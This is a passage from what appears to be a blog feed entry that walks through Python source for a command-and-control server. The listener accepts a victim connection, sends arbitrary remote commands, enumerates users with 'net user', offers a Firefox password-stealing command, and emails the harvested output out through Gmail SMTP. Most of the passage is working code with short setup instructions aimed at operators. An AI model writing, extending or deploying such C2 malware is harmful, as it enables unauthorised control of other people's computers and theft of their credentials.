                <span class="bp">self</span><span class="p">.</span><span class="n">get_firefox_passwords</span><span class="p">()</span>
            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"help"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">help_panel</span><span class="p">()</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">command_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">command_output</span><span class="p">)</span>

</code></pre></div></div>
<p>I will explain the most important parts of the code as follows:</p>

<h2 id="listener-class">Listener class</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Listener</span><span class="p">:</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">options</span> <span class="o">=</span> <span class="p">{</span><span class="s">"get users"</span><span class="p">:</span> <span class="s">"List system valid users (Gmail)"</span><span class="p">,</span> <span class="s">"help"</span><span class="p">:</span> <span class="s">"Show this help panel"</span><span class="p">,</span> <span class="s">"firefox"</span><span class="p">:</span> <span class="s">"Get firefox browser passwords"</span><span class="p">}</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">server_process</span> <span class="o">=</span> <span class="bp">None</span>

        <span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">listen</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Listening for incoming connections...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">client_address</span> <span class="o">=</span> <span class="n">server_socket</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Connection established by </span><span class="si">{</span><span class="n">client_address</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">))</span>
</code></pre></div></div>
<p>We create the <strong>__init__()</strong> method: in the Listener class, I create attributes that are instantiated in the Listener class: self.ip = ip, self.options = options, self.server_process =None. And objects so that the connection can be established.</p>

<p>In the objects one line is important:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">server_socket</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>
<p>This code reutlizes the connection in case it closes, so that we have no problems.</p>

<h2 id="send-command">Send Command</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">command_remotely</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">).</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'cp850'</span><span class="p">)</span>
</code></pre></div></div>

<p>This function is to send the command that has been entered by the user running this program.</p>

<h2 id="run">Run</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>
            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"get users"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">get_user</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"firefox"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">get_firefox_passwords</span><span class="p">()</span>
            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"help"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">help_panel</span><span class="p">()</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">command_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">command_output</span><span class="p">)</span>
</code></pre></div></div>

<p>In this function, we create a while loop to receive and execute the commands continuously. But if the command is = any predefined function in the program, then the specific function will be executed.</p>

<h2 id="send-e-mail">Send E-mail</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_email</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">sender</span><span class="p">,</span> <span class="n">recipients</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="n">subject</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">sender</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="s">', '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">recipients</span><span class="p">)</span>

        <span class="k">with</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP_SSL</span><span class="p">(</span><span class="s">'smtp.gmail.com'</span><span class="p">,</span> <span class="mi">465</span><span class="p">)</span> <span class="k">as</span> <span class="n">smtp_server</span><span class="p">:</span>
            <span class="n">smtp_server</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
            <span class="n">smtp_server</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">recipients</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Emails sent successfully!!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>
</code></pre></div></div>

<p>The purpose of this function is to send e-mail whit the output of the specific command.</p>

<h2 id="example-of-specific-command">Example of Specific Command</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"net user"</span><span class="p">)</span>
        <span class="n">command_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_email</span><span class="p">(</span><span class="s">"Net Users Report - C2"</span><span class="p">,</span> <span class="n">command_output</span><span class="p">,</span> <span class="s">"your@gmail.com"</span><span class="p">,</span> <span class="p">[</span><span class="s">"your@gmail.com"</span><span class="p">],</span> <span class="s">"jdad cnda uvda sawa"</span><span class="p">)</span> <span class="c1"># e-mail addres &amp;&amp; aplication key of yout e-mail addres
</span></code></pre></div></div>
<p>This function is used to obtain valid users from the system and send them by e-mail. In the <strong>self.send_email()</strong> part, you need to put your e-mail where you want to receive the content and the application key. And it is important to have two-step verification on your email account.</p>

<p>Two-step verification:</p>

<p><img src="/assets/images/Command-And-Control/two-set-verification.png" alt="" /></p>

<p>Application Key:</p>

<p><img src="/assets/images/Command-And-Control/email-password.png" alt="" /></p>]]></content><author><name>Arc4he</name><email>arc4.he@gmail.com</email></author><category term="programming" /><category term="python" /><category term="malware" /><category term="C&amp;C" /><category term="programming" /><summary type="html"><![CDATA[A Command and Control is a software to control a client from the server. Is a software to control a client from the server. The command and control server can be controlled by any operator to execute malware for example.]]></summary></entry></feed>